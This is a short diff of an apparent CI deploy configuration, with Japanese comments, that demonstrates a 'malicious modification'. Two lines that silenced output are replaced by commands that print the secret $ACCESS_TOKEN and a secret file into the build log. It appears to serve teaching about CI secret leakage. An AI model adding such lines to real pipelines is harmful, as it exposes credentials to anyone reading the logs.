@@ -11,5 +11,6 @@ after_success:
 - "# これは、デプロイの処理です。"
 - "# 秘密の環境変数 $ACCESS_TOKEN と、秘密のファイル secret を使って、"
 - "# サーバーにアクセスするなどの処理をセキュアに行なっているとしています"
-- "echo $ACCESS_TOKEN >/dev/null 2>&1"
-- "cat ./secret >/dev/null 2>&1"
+- "# ↓↓↓↓悪意のある改変↓↓↓↓"
+- "echo $ACCESS_TOKEN"
+- "cat ./secret"
